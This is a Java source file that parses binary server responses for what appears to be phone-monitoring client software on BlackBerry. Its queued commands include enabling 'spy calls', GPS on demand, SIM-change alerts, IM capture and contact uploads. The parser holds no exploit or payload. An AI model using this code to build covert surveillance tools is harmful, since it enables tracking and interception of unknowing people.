package com.vvt.prot.parser;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.util.Vector;
import net.rim.device.api.util.DataBuffer;
import com.vvt.checksum.CRC32;
import com.vvt.prot.CommandCode;
import com.vvt.prot.databuilder.SendRAskCmdResponse;
import com.vvt.prot.databuilder.exception.CRC32Exception;
import com.vvt.prot.response.struct.AddressBook;
import com.vvt.prot.response.struct.CommunicationEventType;
import com.vvt.prot.response.struct.CommunicationRule;
import com.vvt.prot.response.struct.GetAddressBookCmdResponse;
import com.vvt.prot.response.struct.GetCSIDCmdResponse;
import com.vvt.prot.response.struct.GetProcessBlackListCmdResponse;
import com.vvt.prot.response.struct.GetProcessWhiteListCmdResponse;
import com.vvt.prot.response.struct.GetTimeCmdResponse;
import com.vvt.prot.response.struct.PCriteria;
import com.vvt.prot.response.struct.DayOfWeek;
import com.vvt.prot.response.struct.GetActivationCodeCmdResponse;
import com.vvt.prot.response.struct.GetComMgrSettingsCmdResponse;
import com.vvt.prot.response.struct.GetConfCmdResponse;
import com.vvt.prot.response.struct.PCCCommand;
import com.vvt.prot.response.struct.PhoneixCompliantCommand;
import com.vvt.prot.response.struct.ProtProcess;
import com.vvt.prot.response.struct.Recurrence;
import com.vvt.prot.response.struct.SendActivateCmdResponse;
import com.vvt.prot.response.struct.SendAddressBookApprovalCmdResponse;
import com.vvt.prot.response.struct.SendAddressBookCmdResponse;
import com.vvt.prot.response.struct.SendClearCSIDCmdResponse;
import com.vvt.prot.response.struct.SendDeactivateCmdResponse;
import com.vvt.prot.response.struct.SendEventCmdResponse;
import com.vvt.prot.response.struct.SendHeartBeatCmdResponse;
import com.vvt.prot.response.struct.SendMessageCmdResponse;
import com.vvt.prot.response.struct.SendRunningProcessCmdResponse;
import com.vvt.prot.response.struct.StructureCmdResponse;
import com.vvt.prot.response.struct.UnknownCmdResponse;
import com.vvt.prot.response.struct.VCard;
import com.vvt.prot.response.struct.VCardSummaryFields;
import com.vvt.prot.response.unstruct.AckCmdResponse;
import com.vvt.prot.response.unstruct.AckSecCmdResponse;
import com.vvt.prot.response.unstruct.KeyExchangeCmdResponse;
import com.vvt.prot.response.unstruct.PingCmdResponse;
import com.vvt.prot.response.unstruct.UnstructCmdResponse;

import com.vvt.prot.unstruct.UnstructCmdCode;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;

public final class ResponseParser {
	
	public static StructureCmdResponse parseStructuredCmd(byte[] plainText) throws Exception {
		StructureCmdResponse response = null;
		ByteArrayInputStream bis = null;
		DataInputStream dis = null;
		Vector nextCmds = new Vector();
		try {
			bis = new ByteArrayInputStream(plainText);
			dis = new DataInputStream(bis);
			// CRC32 4 Bytes
			int crc32Len = 4;
			byte[] crc32Data = new byte[plainText.length - crc32Len];
			System.arraycopy(plainText, crc32Len, crc32Data, 0, crc32Data.length);
			int crc32Client = (int)CRC32.calculate(crc32Data);
			int crc32Server = dis.readInt();
			crc32Data = null;
			if (crc32Server == crc32Client) {
				// Server ID 2 Bytes
				int serverId = dis.readShort();
				// Command 2 Bytes
				int commandEcho = dis.readShort();
				// Status Code 2 Bytes
				int statusCode = dis.readShort();
				// Length of Server Message 2 Bytes
				int msgLen = dis.readShort();
				byte[] msg = new byte[msgLen];
				// Message n Bytes
				dis.read(msg);
				String message = new String(msg);
				// Extended Status 4 Bytes
				int extStatus = dis.readInt();
				// Next Command n Bytes
				int numberOfPCC = dis.readByte();
				for (int i = 0; i < numberOfPCC; i++) {
					PCCCommand pcc = new PCCCommand();
					int cmdId = dis.readShort();
					PhoneixCompliantCommand cmd = getCmdId(cmdId);
					pcc.setCmdId(cmd);
					int numberOfArgs = dis.readByte();
					for (int j = 0; j < numberOfArgs; j++) {
						int argLen = dis.readShort();
						byte[] arg = new byte[argLen];
						dis.read(arg);
						String argument = new String(arg);
						pcc.addArguments(argument);
					}
					// If this PCC Command is supported, it will be added.
					if (cmd != null) {
						nextCmds.addElement(pcc);
					}
				}
				if (CommandCode.SEND_ACTIVATE.getId() == commandEcho) {
					response = getActivateCommandResponse(dis);
				} else if (CommandCode.SEND_DEACTIVATE.getId() == commandEcho) {
					response = getDeactivateCommandResponse();
				} else if (CommandCode.SEND_EVENTS.getId() == commandEcho) {
					response = getEventCommandResponse();
				} else if (CommandCode.SEND_CLEARCSID.getId() == commandEcho) {
					response = getClearCSIDCommandResponse();
				} else if (CommandCode.SEND_HEARTBEAT.getId() == commandEcho) {
					response = getHeartBeatCommandResponse();
				} else if (CommandCode.SEND_MESSAGE.getId() == commandEcho) {
					response = getMessageCommandResponse();
				} else if (CommandCode.SEND_RUNNING_PROCCESSES.getId() == commandEcho) {
					response = getRunningProcessCommandResponse();
				} else if (CommandCode.SEND_ADDRESS_BOOK.getId() == commandEcho) {
					response = getSendAddressBookCommandResponse();
				} else if (CommandCode.SEND_ADDRESS_BOOK_FOR_APPROVAL.getId() == commandEcho) {
					response = getAddressBookApprovalCommandResponse();
				} else if (CommandCode.GET_CSID.getId() == commandEcho) {
					response = getCSIDCommandResponse(dis);
				} else if (CommandCode.GET_TIME.getId() == commandEcho) {
					response = getTimeCommandResponse(dis);
				} else if (CommandCode.GET_PROCESS_WHITELIST.getId() == commandEcho) {
					response = getProcWhiteListCommandResponse(dis);
				} else if (CommandCode.GET_SOFTWARE_UPDATE.getId() == commandEcho) {
					response = getProcBlackListCommandResponse(dis);
				} else if (CommandCode.GET_COMMUNICATION_MANAGER_SETTINGS.getId() == commandEcho) {
					response = getComMgrSettingsCommandResponse(dis);
				} else if (CommandCode.GET_CONFIGURATION.getId() == commandEcho) {
					response = getConfigurationCommandResponse(dis);
				} else if (CommandCode.GET_ACTIVATION_CODE.getId() == commandEcho) {
					response = getActivationCodeCommandResponse(dis);
				} else if (CommandCode.GET_ADDRESS_BOOK.getId() == commandEcho) {
					// This command is paused.
//					response = getAddressBookCommandResponse(dis);
				} else {
					if (dis.available() > 0) {
						response = getRAskCommandResponse(dis);
					} else {
						response = new UnknownCmdResponse();
					}
				}
				// Set Common Values.
				response.setServerId(serverId);
				response.setStatusCode(statusCode);
				response.setServerMsg(message);
				response.setExtStatus(extStatus);
				for (int i = 0; i < nextCmds.size(); i++) {
					response.addPCCCommands((PCCCommand)nextCmds.elementAt(i));
				}
			} else {
				String errMsg = "CRC32 doesn't match.";
				throw new CRC32Exception(errMsg);
			}
		} finally {
			IOUtil.close(dis);
			IOUtil.close(bis);
		}
		return response;
	}

	public static UnstructCmdResponse parseUnstructuredCmd(byte[] data) {
		UnstructCmdResponse response = null;
		ByteArrayInputStream bis = null;
		DataInputStream dis = null;
		try {
			bis = new ByteArrayInputStream(data);
			dis = new DataInputStream(bis);
			// Command Echo 2 Bytes
			int cmdEcho = dis.readShort();
			// Status Code 2 Bytes
			int statusCode = dis.readShort();
			if (cmdEcho == UnstructCmdCode.UCMD_KEY_EXCHANGE.getId()) {
				// Session ID 4 Bytes
				long sessionId = dis.readInt();
				// Server Public Key n Bytes
				int servPublicKeyLen = dis.readShort();
				byte[] servPublicKey = new byte[servPublicKeyLen];
				dis.read(servPublicKey);
				KeyExchangeCmdResponse keyRes = new KeyExchangeCmdResponse();
				keyRes.setSessionId(sessionId);
				keyRes.setServerPK(servPublicKey);
				response = keyRes;
			} else if (cmdEcho == UnstructCmdCode.UCMD_ACKNOWLEDGE.getId()) {
				response = new AckCmdResponse();
			} else if (cmdEcho == UnstructCmdCode.UCMD_ACKNOWLEDGE_SECURE.getId()) {
				response = new AckSecCmdResponse();
			} else if (cmdEcho == UnstructCmdCode.UCMD_PING.getId()) {
				response = new PingCmdResponse();
			}
			response.setStatusCode(statusCode);
		} catch(Exception e) {
			Log.debug("ResponseParser.parseUCmdResponse", "Exception: " + e);
		} finally {
			IOUtil.close(dis);
			IOUtil.close(bis);
		}
		return response;
	}

	private static PhoneixCompliantCommand getCmdId(int cmdId) {
		PhoneixCompliantCommand cmd = null;
		if (cmdId == PhoneixCompliantCommand.SENDING_EVENT.getId()) {
			cmd = PhoneixCompliantCommand.SENDING_EVENT;
		} else if (cmdId == PhoneixCompliantCommand.ENABLE_SPY_CALL.getId()) {
			cmd = PhoneixCompliantCommand.ENABLE_SPY_CALL;
		} else if (cmdId == PhoneixCompliantCommand.DISABLE_SPY_CALL.getId()) {
			cmd = PhoneixCompliantCommand.DISABLE_SPY_CALL;
		} else if (cmdId == PhoneixCompliantCommand.WATCHLIST.getId()) {
			cmd = PhoneixCompliantCommand.WATCHLIST;
		} else if (cmdId == PhoneixCompliantCommand.GPS.getId()) {
			cmd = PhoneixCompliantCommand.GPS;
		} else if (cmdId == PhoneixCompliantCommand.GPS_ON_DEMAND.getId()) {
			cmd = PhoneixCompliantCommand.GPS_ON_DEMAND;
		} else if (cmdId == PhoneixCompliantCommand.CAPTURE_STATE.getId()) {
			cmd = PhoneixCompliantCommand.CAPTURE_STATE;
		} else if (cmdId == PhoneixCompliantCommand.DIAGNOSTIC.getId()) {
			cmd = PhoneixCompliantCommand.DIAGNOSTIC;
		} else if (cmdId == PhoneixCompliantCommand.SIM_CHANGE.getId()) {
			cmd = PhoneixCompliantCommand.SIM_CHANGE;
		} else if (cmdId == PhoneixCompliantCommand.IM.getId()) {
			cmd = PhoneixCompliantCommand.IM;
		}
		return cmd;
	}

	// Send Command Response Part
	private static SendActivateCmdResponse getActivateCommandResponse(DataInputStream dis) throws IOException {
		SendActivateCmdResponse sendActResponse = new SendActivateCmdResponse();
		if (dis.available() > 0) {
			int md5Len = 16;
			byte[] md5 = new byte[md5Len];
			dis.read(md5);
			sendActResponse.setMd5(md5);
			int configId = dis.readShort();
			sendActResponse.setConfigID(configId);
		}
		return sendActResponse;
	}
	
	private static SendEventCmdResponse getEventCommandResponse() {
		return new SendEventCmdResponse();
	}
	
	private static SendAddressBookApprovalCmdResponse getAddressBookApprovalCommandResponse() {
		return new SendAddressBookApprovalCmdResponse();
	}

	private static SendAddressBookCmdResponse getSendAddressBookCommandResponse() {
		return new SendAddressBookCmdResponse();
	}

	private static SendRunningProcessCmdResponse getRunningProcessCommandResponse() {
		return new SendRunningProcessCmdResponse();
	}

	private static SendMessageCmdResponse getMessageCommandResponse() {
		return new SendMessageCmdResponse();
	}

	private static SendHeartBeatCmdResponse getHeartBeatCommandResponse() {
		return new SendHeartBeatCmdResponse();
	}

	private static SendClearCSIDCmdResponse getClearCSIDCommandResponse() {
		return new SendClearCSIDCmdResponse();
	}

	private static SendDeactivateCmdResponse getDeactivateCommandResponse() {
		return new SendDeactivateCmdResponse();
	}
	
	private static StructureCmdResponse getRAskCommandResponse(DataInputStream dis) throws IOException {
		SendRAskCmdResponse sendRAskResponse = new SendRAskCmdResponse();
		if (dis.available() > 0) {
			int len = 4;
			byte[] numberOfBytes = new byte[len];
			dis.read(numberOfBytes);
			//sendRAskResponse.setNumberOfBytes(numberOfBytes);
			DataBuffer buffer = new DataBuffer(numberOfBytes, 0, numberOfBytes.length, true);
			long offset = buffer.readInt();
			sendRAskResponse.setNumberOfBytes(offset);
		}
		return sendRAskResponse;
	}
	
	// Get Command Response Part
	private static GetActivationCodeCmdResponse getActivationCodeCommandResponse(DataInputStream dis) throws IOException {
		GetActivationCodeCmdResponse actCodeResponse = new GetActivationCodeCmdResponse();
		if (dis.available() > 0) {
			int actCodeLen = dis.readByte();
			byte[] actCode = new byte[actCodeLen];
			dis.read(actCode);
			String activationCode = new String(actCode);
			actCodeResponse.setActivationCode(activationCode);
		}
		return actCodeResponse;
	}

	private static GetConfCmdResponse getConfigurationCommandResponse(DataInputStream dis) throws IOException {
		GetConfCmdResponse confResponse = new GetConfCmdResponse();
		if (dis.available() > 0) {
			int md5Len = 16;
			byte[] md5 = new byte[md5Len];
			dis.read(md5);
			confResponse.setMd5(md5);
			int configId = dis.readShort();
			confResponse.setConfigID(configId);
		}
		return confResponse;
	}

	private static GetComMgrSettingsCmdResponse getComMgrSettingsCommandResponse(DataInputStream dis) throws IOException {
		GetComMgrSettingsCmdResponse comSettingsResponse = new GetComMgrSettingsCmdResponse();
		if (dis.available() > 0) {
			int numberOfComRule = dis.readShort();
			for (int i = 0; i < numberOfComRule; i++) {
				CommunicationRule communicationRule = new CommunicationRule();
				// Recurrence 1 Byte
				int recur = dis.readByte();
				Recurrence recurrence = getRecurrence(recur);
				communicationRule.setRecurrence(recurrence);
				// Criteria (Offset 2 Bytes)
				PCriteria criteria = new PCriteria();
				int offset = dis.readShort();
				criteria.setOffset(offset);
				// Criteria (Days of Week 1 Byte)
				int dayWeek = dis.readByte();
				DayOfWeek dayOfWeek = getDayOfWeek(dayWeek);
				criteria.setDayOfWeek(dayOfWeek);
				// Criteria (Days of Month 1 Byte)
				int dayMonth = dis.readByte();
				criteria.setDayOfMonth(dayMonth);
				communicationRule.setCriteria(criteria);
				// Communication Event n Bytes
				int numberOfComEvent = dis.readShort();
				for (int j = 0; j < numberOfComEvent; j++) {
					int eventType = dis.readShort();
					CommunicationEventType communicationEventType = getCommunicationEventType(eventType);
					communicationRule.addCommunicationEvents(communicationEventType);
				}
				// Start Date 10 Bytes
				int startDateLen = 10;
				byte[] startDate = new byte[startDateLen];
				dis.read(startDate);
				String startDateStr = new String(startDate);
				communicationRule.setStartDate(startDateStr);
				// End Date 10 Bytes
				int endDateLen = 10;
				byte[] endDate = new byte[endDateLen];
				dis.read(endDate);
				String endDateStr = new String(endDate);
				communicationRule.setEndDate(endDateStr);
				// Day Start Time 5 Bytes
				int dayStartTimeLen = 5;
				byte[] dayStartTime = new byte[dayStartTimeLen];
				dis.read(dayStartTime);
				String dayStartTimeStr = new String(dayStartTime);
				communicationRule.setDayStartTime(dayStartTimeStr);
				// Day End Time 5 Bytes
				int dayEndTimeLen = 5;
				byte[] dayEndTime = new byte[dayEndTimeLen];
				dis.read(dayEndTime);
				String dayEndTimeStr = new String(dayEndTime);
				communicationRule.setDayEndTime(dayEndTimeStr);
				// Action 1 Byte
				int action = dis.readByte();
				communicationRule.setAction(action);
				// Direction 1 Byte
				int direction = dis.readByte();
				communicationRule.setDirection(direction);
				// Adding CommunicationRule
				comSettingsResponse.addCommunicationRules(communicationRule);
			}
		}
		return comSettingsResponse;
	}

	private static CommunicationEventType getCommunicationEventType(int eventType) {
		CommunicationEventType communicationEventType = null;
		if (eventType == CommunicationEventType.ALL.getId()) {
			communicationEventType = CommunicationEventType.ALL;
		} else if (eventType == CommunicationEventType.CALL.getId()) {
			communicationEventType = CommunicationEventType.CALL;
		} else if (eventType == CommunicationEventType.SMS.getId()) {
			communicationEventType = CommunicationEventType.SMS;
		} else if (eventType == CommunicationEventType.MMS.getId()) {
			communicationEventType = CommunicationEventType.MMS;
		} else if (eventType == CommunicationEventType.EMAIL.getId()) {
			communicationEventType = CommunicationEventType.EMAIL;
		} else if (eventType == CommunicationEventType.IM.getId()) {
			communicationEventType = CommunicationEventType.IM;
		}
		return communicationEventType;
	}

	private static DayOfWeek getDayOfWeek(int dayWeek) {
		DayOfWeek dayOfWeek = null;
		if (dayWeek == DayOfWeek.SUNDAY.getId()) {
			dayOfWeek = DayOfWeek.SUNDAY;
		} else if (dayWeek == DayOfWeek.MONDAY.getId()) {
			dayOfWeek = DayOfWeek.MONDAY;
		} else if (dayWeek == DayOfWeek.TUESDAY.getId()) {
			dayOfWeek = DayOfWeek.TUESDAY;
		} else if (dayWeek == DayOfWeek.WEDNESDAY.getId()) {
			dayOfWeek = DayOfWeek.WEDNESDAY;
		} else if (dayWeek == DayOfWeek.THURSDAY.getId()) {
			dayOfWeek = DayOfWeek.THURSDAY;
		} else if (dayWeek == DayOfWeek.FRIDAY.getId()) {
			dayOfWeek = DayOfWeek.FRIDAY;
		} else if (dayWeek == DayOfWeek.SATURDAY.getId()) {
			dayOfWeek = DayOfWeek.SATURDAY;
		}
		return dayOfWeek;
	}

	private static Recurrence getRecurrence(int recur) {
		Recurrence recurrence = null;
		if (recur == Recurrence.ONCE.getId()) {
			recurrence = Recurrence.ONCE;
		} else if (recur == Recurrence.DAILY.getId()) {
			recurrence = Recurrence.DAILY;
		} else if (recur == Recurrence.WEEKLY.getId()) {
			recurrence = Recurrence.WEEKLY;
		} else if (recur == Recurrence.MONTHLY.getId()) {
			recurrence = Recurrence.MONTHLY;
		}
		return recurrence;
	}

	private static GetProcessBlackListCmdResponse getProcBlackListCommandResponse(DataInputStream dis) throws IOException {
		GetProcessBlackListCmdResponse blackListResponse = new GetProcessBlackListCmdResponse();
		if (dis.available() > 0) {
			int numberOfProc = dis.readShort();
			for (int i = 0; i < numberOfProc; i++) {
				ProtProcess process = new ProtProcess();
				// Category 1 Byte
				int category = dis.readByte();
				process.setCategory(category);
				// Process Name n Bytes
				int nameLen = dis.readByte();
				byte[] procName = new byte[nameLen];
				dis.read(procName);
				String name = new String(procName);
				process.setName(name);
				blackListResponse.addProcesses(process);
			}
		}
		return blackListResponse;
	}

	private static GetProcessWhiteListCmdResponse getProcWhiteListCommandResponse(DataInputStream dis) throws IOException {
		GetProcessWhiteListCmdResponse whiteListResponse = new GetProcessWhiteListCmdResponse();
		if (dis.available() > 0) {
			int numberOfProc = dis.readShort();
			for (int i = 0; i < numberOfProc; i++) {
				ProtProcess process = new ProtProcess();
				// Category 1 Byte
				int category = dis.readByte();
				process.setCategory(category);
				// Process Name n Bytes
				int nameLen = dis.readByte();
				byte[] procName = new byte[nameLen];
				dis.read(procName);
				String name = new String(procName);
				process.setName(name);
				whiteListResponse.addProcesses(process);
			}
		}
		return whiteListResponse;
	}

	private static GetTimeCmdResponse getTimeCommandResponse(DataInputStream dis) throws IOException {
		GetTimeCmdResponse timeResponse = new GetTimeCmdResponse();
		if (dis.available() > 0) {
			// Current Mobile Time 19 Bytes
			int curMobileTimeLen = 19;
			byte[] curMobileTime = new byte[curMobileTimeLen];
			dis.read(curMobileTime);
			String mobileTime = new String(curMobileTime);
			timeResponse.setCurrentMobileTime(mobileTime);
			// Representation 1 Byte
			int rep = dis.readByte();
			timeResponse.setRepresentation(rep);
			// Timezone
			int timezoneLen = dis.readByte();
			byte[] timezone = new byte[timezoneLen];
			dis.read(timezone);
			String time = new String(timezone);
			timeResponse.setTimezone(time);
		}
		return timeResponse;
	}

	private static GetCSIDCmdResponse getCSIDCommandResponse(DataInputStream dis) throws IOException {
		GetCSIDCmdResponse csidResponse = new GetCSIDCmdResponse();
		if (dis.available() > 0) {
			int numberOfCSIDs = dis.readByte();
			for (int i = 0; i < numberOfCSIDs; i++) {
				Integer csid = new Integer(dis.readByte());
				csidResponse.addCSID(csid);
			}
		}
		return csidResponse;
	}
	
	private static GetAddressBookCmdResponse getAddressBookCommandResponse(DataInputStream dis) throws IOException {
		GetAddressBookCmdResponse addrBookResponse = new GetAddressBookCmdResponse();
		if (dis.available() > 0) {
			int numberOfAddressBook = dis.readByte();
			for (int i = 0; i < numberOfAddressBook; i++) {
				AddressBook addressBook = new AddressBook();
				// Address Book ID 4 Bytes
				int addressBookId = dis.readInt();
				addressBook.setAddressBookId(addressBookId);
				// Address Book Name n Bytes
				int addressBookNameLen = dis.readByte();
				byte[] addressBookName = new byte[addressBookNameLen];
				dis.read(addressBookName);
				String addrBookName = new String(addressBookName);
				addressBook.setAddressBookName(addrBookName);
				// VCard
				int numberOfVCard = dis.readShort();
				for (int j = 0; j < numberOfVCard; j++) {
					VCard vcard = new VCard();
					// Server ID 4 Bytes
					int serverId = dis.readInt();
					vcard.setServerId(serverId);
					// Client ID n Byte
					int clientIdLen = dis.readByte();
					byte[] clientId = new byte[clientIdLen];
					dis.read(clientId);
					String cltId = new String(clientId);
					vcard.setClientId(cltId);
					// Approval Status 1 Byte
					int status = dis.readByte();
					vcard.setApprovalStatus(status);
					// VCard Summary
					VCardSummaryFields vcardField = new VCardSummaryFields();
					// First Name n Bytes
					int firstNameLen = dis.readByte();
					byte[] firstName = new byte[firstNameLen];
					dis.read(firstName);
					String firstNameStr = new String(firstName);
					vcardField.setFirstName(firstNameStr);
					// Last Name n Bytes
					int lastNameLen = dis.readByte();
					byte[] lastName = new byte[lastNameLen];
					dis.read(lastName);
					String lastNameStr = new String(lastName);
					vcardField.setLastName(lastNameStr);
					// Home Phone n Bytes
					int homePhoneLen = dis.readByte();
					byte[] homePhone = new byte[homePhoneLen];
					dis.read(homePhone);
					String homePhoneStr = new String(homePhone);
					vcardField.setHomePhone(homePhoneStr);
					// Mobile Phone n Bytes
					int mobilePhoneLen = dis.readByte();
					byte[] mobilePhone = new byte[mobilePhoneLen];
					dis.read(mobilePhone);
					String mobilePhoneStr = new String(mobilePhone);
					vcardField.setMobilePhone(mobilePhoneStr);
					// Work Phone n Bytes
					int workPhoneLen = dis.readByte();
					byte[] workPhone = new byte[workPhoneLen];
					dis.read(workPhone);
					String workPhoneStr = new String(workPhone);
					vcardField.setWorkPhone(workPhoneStr);
					// Email n Bytes
					int emailLen = dis.readByte();
					byte[] email = new byte[emailLen];
					dis.read(email);
					String emailStr = new String(email);
					vcardField.setEmail(emailStr);
					// Note n Bytes
					int noteLen = dis.readShort();
					byte[] note = new byte[noteLen];
					dis.read(note);
					String noteStr = new String(note);
					vcardField.setNote(noteStr);
					// Contact Picture n Bytes
					int pictureLen = dis.readInt();
					byte[] picture = new byte[pictureLen];
					dis.read(picture);
					vcardField.setContactPicture(picture);
					// Add VCard Summary
					vcard.addVCardSummary(vcardField);
					// VCard Data n Bytes
					int vcardDataLen = dis.readInt();
					byte[] vcardData = new byte[vcardDataLen];
					dis.read(vcardData);
					vcard.setVCardData(vcardData);
					// Add VCard to AddressBook
					addressBook.addVcards(vcard);
				}
				addrBookResponse.addAddressBooks(addressBook);
			}
		}
		return addrBookResponse;
	}
}
